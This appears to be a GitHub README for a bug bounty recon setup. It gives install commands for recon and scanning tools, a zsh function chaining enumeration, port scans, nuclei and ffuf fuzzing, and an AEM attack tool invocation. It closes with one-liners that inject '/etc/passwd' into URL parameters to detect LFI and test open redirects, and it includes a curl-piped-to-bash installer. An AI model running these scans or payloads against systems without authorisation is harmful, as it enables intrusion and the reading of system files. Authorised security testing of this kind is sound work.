# Recon-bugbounty

<a href="https://www.buymeacoffee.com/hackerspider1" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" style="height: 51px !important;width: 217px !important;" ></a>

Simple recon using multiple tools!

If you have Go installed and configured (i.e. with $GOPATH/bin in your $PATH):

### Install Assetfinder

`
▶ go get -u github.com/tomnomnom/assetfinder
`

### Install anew

`
▶ go get -u github.com/tomnomnom/anew
`

### Install Amass

If you have brew installed if not `/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"`

`
▶ brew install amass
`

### Install Subfinder

`
▶ go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
`

### Install httpx

`
▶ go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
`

### Install Aquatone

- Download the [latest release](https://github.com/michenriksen/aquatone/releases/latest) of Aquatone for your operating system.
- Uncompress the zip file and move the aquatone binary to your desired location. You probably want to move it to a location in your $PATH for easier use.

### Install Naabu

`
▶ go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
`

### Install Subjack

`
▶ go get github.com/haccer/subjack
`

### Install Nuclei

`
▶ go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
`

### Install Jaeles

If you have a Go environment, make sure you have Go >= 1.13 with Go Modules enable and run the following command.

`
▶ GO111MODULE=on go get github.com/jaeles-project/jaeles
`

### Install ffuf

`
▶ go get -u github.com/ffuf/ffuf
`
You can use dirsearch as well.

`
▶ pip3 install dirsearch
`

Download the wordlist `▶ wget "https://raw.githubusercontent.com/hackerspider1/Recon-bugbounty/main/dir.txt"`

# Enum

Add the following in your .zshrc

```
enum(){
        assetfinder -subs-only "$1" | tee -a domains
        cat domains | anew domains.txt
	amass enum -brute -active --passive -d "$1" -o domains -config ~/.config/amass/config.ini
        cat domains | anew domains.txt
        rm domains
        subfinder -silent -d "$1" -o domains
        cat domains | anew domains.txt
        rm domains
        cat domains.txt | httpx -silent | tee -a hosts.txt
        cat domains.txt | aquatone -out screens -scan-timeout 200 -screenshot-timeout 60000 -ports xlarge
        naabu -silent -iL domains.txt > portscan.txt
        subjack -w domains.txt -t 100 -timeout 20 -o subjack_out.txt --ssl -c ~/fingerprints.json
	nuclei -l hosts.txt -t cves/ | tee -a vuln.txt
	jaeles scan -s ~/.jaeles/ -U hosts.txt
	for i in $(cat hosts.txt); do ffuf -u $i/FUZZ -w ~/Documents/bugbounty/wordlist/dir.txt -ac -c -e php,txt,asp,html,aspx; done
}
```

You can add Git-hound ass well in it

- Download the [latest release of GitHound](https://github.com/tillson/git-hound/releases)
- Create a ./config.yml or ~/.githound/config.yml with your GitHub username and password. Optionally, include your 2FA TOTP seed. See config.example.yml.
- If it's your first time using the account on the system, you may receieve an account verification email.

`echo "guptashubham.com" | git-hound`

add following line in the last of #enum (.zshrc)

```
echo "$1" | git-hound
```

# Aemhack

```
git clone https://github.com/0ang3el/aem-hacker.git
cd aem-hacker
python3 aem_hacker.py -u https://aem.webapp --host your_vps_hostname_ip
```
Add it to .zshrc

`aemhack (){
python3 ~/aem-directory/aem-hacker/aem_hacker.py -u $1 --host $2
}`

# One-Liner

### LFI

```
lfi () {
gau $1 | gf lfi | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
}
```

### Open-redirect

```
open-redirect () {
local LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
}
```


# Thanks
#### We use tools which are developed by the following people
[OWASP](https://github.com/OWASP/), [ProjectDiscovery](https://github.com/projectdiscovery/), [Tom Hudson](https://github.com/tomnomnom/)
